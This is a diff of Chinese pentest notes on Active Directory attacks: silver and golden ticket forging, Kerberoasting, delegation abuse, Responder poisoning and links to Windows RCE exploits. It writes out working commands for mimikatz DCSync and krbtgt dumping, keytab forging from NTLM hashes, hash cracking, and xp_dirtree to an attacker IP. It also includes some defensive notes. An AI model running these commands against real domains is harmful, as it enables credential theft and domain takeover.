+    ktutil                      # 使用 ktutil 创建一个 keytab 文件
+    ktutil: addent -p uberuser@CORP.SOMEWHATREALNEWS.COM -k 1 -key -e rc4-hmac  # 指定用户和 FQDN 的全大写版本
+    Key for uberuser@CORP.SOMEWHATREALNEWS.COM (hex): 88e4d9fabaecf3dec18dd80905521b29  # 输入 rc4-hmac（NTLM）哈希值
+    ktutil: wkt /tmp/a.keytab   # 把 keytab 文件写到磁盘上
+    ktutil: exit                # 退出
+    kinit -V -k -t /tmp/a.keytab -f uberuser@CORP.SOMEWHATREALNEWS.COM  # 使用 keytab 文件创建一个 kerberos ticket
+    klist                       # 验证
+    ```
+
+**other**
+
+由于白银票据需要目标服务器的 Hash，所以没办法生成对应域内所有服务器的票据，也不能通过 TGT 申请。因此只能针对服务器上的某些服务去伪造，伪造的服务类型列表如下:
+
+| 服务注释                                   |    服务名            |
+| -                                         |   -                 |
+| WMI 	                                    |   HOST、RPCSS       |
+| Powershell Remoteing                      |	HOST、HTTP        |
+| WinRM                                     |	HOST、HTTP        |
+| Scheduled Tasks                           |	HOST              |
+| LDAP 、DCSync                             |	LDAP              |
+| Windows File Share (CIFS)                 |	CIFS              |
+| Windows Remote ServerAdministration Tools |	RPCSS、LDAP、CIFS |
+
+**白银票据(Silver Tickets)防御**
+
+1. 尽量保证服务器凭证不被窃取
+2. 开启 PAC (Privileged Attribute Certificate) 特权属性证书保护功能，PAC 主要是规定服务器将票据发送给 kerberos 服务，由 kerberos 服务验证票据是否有效。
+
+开启方式:将注册表中 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters` 中的 ValidateKdcPacSignature 设置为 1。
+
+---
+
+#### Golden_Tickets
+
+**原理**
+
+黄金票据主要是发生在 kerberos 的第三和第四步骤上。
+
+第二步骤时，AS 发给客户端的数据。
 ```
-
-#### PTT
-
-**黄金票据(Golden Tickets)**
-
-krbtgt 账户：每个域控制器都有一个 krbtgt 的用户，是 KDC 的服务账户，用来创建票据授予服务（TGS）加密的密钥。
+[Client_ntlm_hash(K(c,tgs))],[Krbtgt_ntlm_hash(k(c,tgs),Client_name(DomainName\Username),TGT_EndTime)]
+```
+在第三步骤时，客户端拥有两个数据，一个是自己账号 ntlm_hash 加密的 session_key、一个是 TGT 凭证，而这个 TGT 凭证是 kertgt 的 ntlm_hash 加密的信息。
 
 攻击者在获取了 krbtgt 账号的 NTLM Hash 之后，通过发送伪造的 TGT(包括 sessionkey)给 TGS 换取任意服务的Client-To-Server Ticket（ST，服务票据），从而获得域内的任意服务权限。即拥有黄金票据就拥有了域内若干权限。
 
-黄金票据的注意事项：
+如第三步骤中需要发送的内容
+```
+[Session_key(Authenticator（[DomainName\Username,ServerName(DomainName\Server)]）)],[TGT（Krbtgt_ntlm_hash(k(c,tgs),Client_name(DomainName\Username),TGT_EndTime)）]
+```
+
+这样，我们就可以访问域内任意一台服务器.
+
+**黄金票据的注意事项**
 - Windows 事件日志不区分 TGT 的合法性，即黄金票据的行为隐蔽性高
 - 伪造黄金票据的时候，可以离线生成，减少痕迹
 - krbtgt 的密码被修改了，生成的黄金票据就会失效
@@ -265,84 +679,60 @@ krbtgt 账户：每个域控制器都有一个 krbtgt 的用户，是 KDC 的服
 - 黄金票据的有效期是十年，即使域管更改了密码，也可以对域内进行十年的权限维持（除了域的认证机制改变等因素）
 - 可以使用禁用、删除的帐户进行冒充，甚至是在 Active Directory 中不存在的帐户
 
-可以通过使用 mimikatz 的 DCSync 获取伪造黄金票据需要的 krbtgt 账号的 hash。该方法中，mimikatz 会模拟域控，向目标域控请求密码账号，不用登录域控，也不用提取 NTDS.DIT 文件。但是该操作需要域管在或者其他高权限账户下进行。
-
-使用 mimikatz 伪造的黄金票据：
-```
-mimikatz.exe "kerberos::golden /domain:<域名> /sid:<域SID> /rc4:<KRBTGT NTLM Hash> /user:<任意用户名> /ptt" exit
-```
-在数据库服务器上，利用域管理员的权限获得 krbtgt 的 NTLM 哈希 36f9d9e6d98ecf8307baf4f46ef842a2，SID 为 S-1-5-21-1812960810-2335050734-3517558805：
-```
-lsadump::dcsync /domain:0day.org /user:krbtgt
-```
-
-得到 krbtgt 哈希之后，使用 mimikatz 的 `kerberos::golden` 生成黄金票据 `golden.kiribi`：
-```
-kerberos::golden /admin:Administrator /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /krbtgt:36f9d9e6d98ecf8307baf4f46ef842a2 /ticket:golden.kiribi
-```
-`/admin` 为伪造的用户名，用户名可以任意伪造 `/domain` 为目标的域名 `/sid` 为目标域名的 SID `/krbtgt` 为 krbtgt 账户密码的 NTLM Hash `/ticket` 为要伪造的黄金票据的名称
-
-常见域内账户 SID：
+**常见域内账户 SID**
 - 域用户 SID：S-1-5-21 -513
 - 域管理员 SID：S-1-5-21 -512
 - 架构管理员 SID：S-1-5-21 -518
 - 企业管理员 SID：S-1-5-21 -519（只有在域林根域中伪造票据时才有效，用 AD 域林管理员权限添加就使用 `/sids` 参数）
 - 组策略创建者所有者 SID：S-1-5-21 -520
 
-利用 mimikatz 的 kerberos::ptt 将黄金票据 golden.kiribi 注入到内存中：
-```
-//清除缓存的票据
-kerberos::purge
-//注入黄金票据golden.kiribi
-kerberos::ptt golden.kiribi
-//列出票据
-kerberos::list
-```
-> 导入的票据在20分钟内有效，过期之后再次导入就行
+**黄金票据特点**
 
-可以访问域控共享目录，还能在 DC 上远程执行 psexec
+1. 需要与 DC 通信
+2. 需要 krbtgt 用户的 hash
+3. 从攻击面来看，获取 krbtgt 用户的 hash 后，可以在域中进行持久性的隐藏，并且日志无法溯源，但是需要拿到 DC 权限，使用黄金票据能够在一个域环境中长时间控制整个域。
+4. 从防御角度来看，需要经常更新 krbtgt 的密码，才能够使得原有的票据失效。最根本的办法是不允许域管账户登录其他服务器。
 
-但是需要注意的是用 psexec 远程执行命令的时候，需要不能使用 IP 访问。使用 NetBios 的服务名访问才会走 Kerberos 认证，达到伪造凭据的攻击
+**黄金票据的攻击流程**
 
-- **其他途径**
-    - https://pentestlab.blog/tag/dcsync/
+可以通过使用 mimikatz 的 DCSync 获取伪造黄金票据需要的 krbtgt 账号的 hash。该方法中，mimikatz 会模拟域控，向目标域控请求密码账号，不用登录域控，也不用提取 NTDS.DIT 文件。但是该操作需要域管在或者其他高权限账户下进行。
 
-    获取 krbtgt 账户就直接跳过获取 krbtgt 哈希的步骤。
-    1. 使用 meterpreter 的 kiwi 扩展可以导出：`dcsync_ntlm krbtgt`
-    2. mimikatz 可以在域控的本地安全认证(Local Security Authority)上直接读取 `mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt"`
-    3. 将域控中的 ntds.dit 复制出来，使用其他工具解析
+mimikatz 的 Golden_Tickets 相关操作见 [mimikatz 笔记](../../工具/mimikatz.md#Golden_Tickets)
 
-**白银票据(Silver Tickets)**
+**其他途径**
+- https://pentestlab.blog/tag/dcsync/
 
-伪造的 `Client-To-Server Ticket`(也有唤作 ST 和 Service Ticket)被称为白银票据。在不与 KDC 通信情况下，通过获取 Server 端服务账号的 NTLM Hash 值，就能伪造该 Server 端服务的票据。不过在 TGT 中已包含了服务实例的唯一标识(SPN 服务)，白银票据就只能访问指定的服务。
+获取 krbtgt 账户就直接跳过获取 krbtgt 哈希的步骤。
+1. 使用 meterpreter 的 kiwi 扩展可以导出：`dcsync_ntlm krbtgt`
+2. mimikatz 可以在域控的本地安全认证(Local Security Authority)上直接读取 `mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt"`
+3. 将域控中的 ntds.dit 复制出来，使用其他工具解析
 
-白银票据的攻击流程：
-- 获取服务端计算机的服务账号或者服务端计算机账号的 NTLM 哈希（如通过 kerberoast 获取）
-- 通过 mimikatz 的 kerberos::golden 传递域 SID、目标主机名、服务名称、伪造的用户名、等信息创建白银票据
-- 将票据注入到内存，并访问服务
+**白银票据与黄金票据的不同点**
 
-使用 mimikatz 伪造白银票据：
-```
-mimikatz.exe "kerberos::golden /domain:<域名> /sid:<域 SID> /target:<目标服务器主机名> /service:<服务类型> /rc4:<NTLM Hash> /user:<用户名> /ptt" exit
-```
+- 访问权限不同
+    - Golden Ticket: 伪造 TGT,可以获取任何 Kerberos 服务权限
+    - Silver Ticket: 伪造 TGS,只能访问指定的服务
 
-例子：访问域控上的 cifs 服务（Windoiws 主机间的文件共享）
+- 加密方式不同
+    - Golden Ticket 由 Kerberos 的 Hash 加密
+    - Silver Ticket 由服务账号(通常为计算机账户)Hash 加密
 
-在域控上执行以下命令获取域控主机的本地管理员账户 NTLM Hash 为 0f6debeb6023903247c4abe5e5021e23，SID 为 S-1-5-21-1812960810-2335050734-3517558805：
-```
-mimikatz.exe log "privilege::debug" "sekurlsa::logonpasswords" exit
-```
+- 认证流程不同
+    - Golden Ticket 的利用过程需要访问域控,而 Silver Ticket 不需要
 
-将生成白银票据注入到内存中,并查看票据生成情况。查看目标的文件共享服务成功：
-```
-kerberos::golden /domain:0day.org /target:OWA2010SP3.0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /service:cifs /rc4:0f6debeb6023903247c4abe5e5021e23 /user:FFFF /ptt /id:1183
+---
 
-//不加id开关也行
+### PTK
 
-kerberos::golden /domain:0day.org /target:OWA2010SP3.0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /service:cifs /rc4:0f6debeb6023903247c4abe5e5021e23 /user:FFFF /ptt
-```
+mimikatz 的 PTK 相关操作见 [mimikatz 笔记](../../工具/mimikatz.md#ptk)
+
+---
 
 ### Kerberoast
+
+`Kerberos TGS票据离线破解`
+
+> 以下内容来自文章 <sup>[[浅学Windows认证](https://b404.xyz/2019/07/23/Study-Windows-Authentication/#kerberoast)]</sup>
 
 服务票据使用服务账户的 NTLM Hash 加密，不用获取运行该服务系统的 shell，任何域用户就可以转储 Hash
 
@@ -365,7 +755,7 @@ Kerberoast 攻击涉及五个步骤：
 - 密码到期时间
 - 最后一次登录时间
     ```
-    net user administrator /domain可查看
+    net user administrator /domain  可查看
     ```
 
 攻击者最感兴趣的是具有高权限用户组的服务帐户如域管理员组的成员。要快速列出高权限用户组的服务帐户的方法是枚举“AdminCount” 属性等于“1”的所有帐户。攻击者只需要向 AD 请求具有 SPN 且 AdminCount = 1 的所有用户帐户。
@@ -415,7 +805,7 @@ klist
 kerberos::list /export
 ```
 
-使用 https://github.com/nidem/kerberoast 工具破解，得到sqlsrv密码为Admin12345：
+使用 https://github.com/nidem/kerberoast 工具破解，得到 sqlsrv 密码为 Admin12345：
 ```
 python tgsrepcrack.py dict.txt 2-40a00000-jack@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi
 ```
@@ -431,7 +821,11 @@ kerberos::ptt test.kirbi
 ```
 攻击者知道一台服务器(或多台服务器)的服务账户和密码，就可以通过此方法将其域用户权限提升到域管。
 
+---
+
 ### Kerberoasting
+
+> 以下内容来自文章 <sup>[[浅学Windows认证](https://b404.xyz/2019/07/23/Study-Windows-Authentication/#kerberoasting)]</sup>
 
 kerberoast 攻击，利用 mimikatz 从内存中导出票据破解。而 Kerberoasting 攻击可以不使用 mimikatz，且普通用户权限就可以实现。
 
@@ -472,9 +866,13 @@ hashcat64.exe -m 13100 -w 3 -a 3 -m 13100 hash -w 3 -a 3 ?l?l?l?l?l?l?l
 ./john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
 
+---
+
 ### 委派
 
 #### 查找域中委派主机或账户
+
+> 以下内容来自文章 <sup>[[浅学Windows认证](https://b404.xyz/2019/07/23/Study-Windows-Authentication/#%E6%9F%A5%E6%89%BE%E5%9F%9F%E4%B8%AD%E5%A7%94%E6%B4%BE%E4%B8%BB%E6%9C%BA%E6%88%96%E8%B4%A6%E6%88%B7)]</sup>
 
 当服务账号被设置为非约束性委派时，其 `userAccountControl` 属性会包含为 TRUSTED_FOR_DELEGATION;当被设置为约束性委派时，其 userAccountControl 属性包含 TRUSTED_TO_AUTH_FOR_DELEGATION（T2A4D），且 msDS-AllowedToDelegateTo 属性会被设置为哪些协议:
 
@@ -519,6 +917,28 @@ kekeo.exe "tgs::s4u /tgt:TGT_sqlsvr@0DAY.ORG_krbtgt~0day.org@0DAY.ORG.kirbi /use
 Tgs::s4u /tgt:service_account_tgt_file /user:administrator@testlab.com /service:service_to_access
 ```
 
+## 毒化LLMNR和NBT-NS请求
+
+**相关文章**
+- [Windows环境中使用Responder获取NTLMv2哈希并利用](https://www.freebuf.com/articles/system/194549.html)
+- [攻防最前线：一封邮件就能捕获你的口令散列值](https://www.secrss.com/articles/8143)
+- [Steal_NTLMv2_hash_using_File_Download_vulnerability](https://github.com/incredibleindishell/Windows-AD-environment-related/blob/master/Steal_NTLMv2_hash_using_File_Download_vulnerability/README.md) - 任意文件下载漏洞配合 Responder 毒化
+
+**工具**
+- [SpiderLabs/Responder](https://github.com/SpiderLabs/Responder)
+    ```
+    python Responder.py -I eth0
+    ```
+    在 Windows 机器上 ：打开文件浏览器，连接 file:////<linuxIPaddress>/test.htlm (或者任意文件名)；
+    ```
+    cd /usr/share/responder/logs
+    ```
+
+    或者配合 mssql
+    ```
+    xp_dirtree "\\<linuxIPaddress>\aaa.com"
+    ```
+
 ---
 
 # 漏洞利用
@@ -560,7 +980,7 @@ Tgs::s4u /tgt:service_account_tgt_file /user:administrator@testlab.com /service:
 - POC | Payload | exp
     - [MS15-034 Checker](https://pastebin.com/ypURDPc4)
 
-- 文章
+- 相关文章
     - [MS15-034/CVE-2015-1635 HTTP远程代码执行漏洞分析](http://blogs.360.cn/post/cve_2015_6135_http_rce_analysis.html)
 
 - MSF 模块
@@ -593,7 +1013,7 @@ Tgs::s4u /tgt:service_account_tgt_file /user:administrator@testlab.com /service:
     - ["永恒之蓝"勒索蠕虫漏洞修复工具](https://www.qianxin.com/other/wannacryfix)
 
 **bluekeep & CVE-2019-0708**
-- 文章
+- 相关文章
     - [RDP Stands for "Really DO Patch!" – Understanding the Wormable RDP Vulnerability CVE-2019-0708](https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/rdp-stands-for-really-do-patch-understanding-the-wormable-rdp-vulnerability-cve-2019-0708/)
     - [worawit/CVE-2019-0708](https://github.com/worawit/CVE-2019-0708/blob/master/NOTE.md)
 
@@ -634,8 +1054,12 @@ Tgs::s4u /tgt:service_account_tgt_file /user:administrator@testlab.com /service:
 
     本次漏洞存在于微软 SMBv3.0 协议中，该漏洞是由 SMBv3 处理恶意压缩数据包时进入错误流程造成的。攻击者利用该漏洞无须权限即可实现远程代码执行，受黑客攻击的目标系统只需开机在线即可能被入侵。
 
+- 相关文章
+    - [Exploiting SMBGhost (CVE-2020-0796) for a Local Privilege Escalation: Writeup + POC](https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/)
+
 - POC | Payload | exp
     - [ollypwn/SMBGhost](https://github.com/ollypwn/SMBGhost)
+    - [chompie1337/SMBGhost_RCE_PoC](https://github.com/chompie1337/SMBGhost_RCE_PoC)
 
 - 修复工具
     - https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796
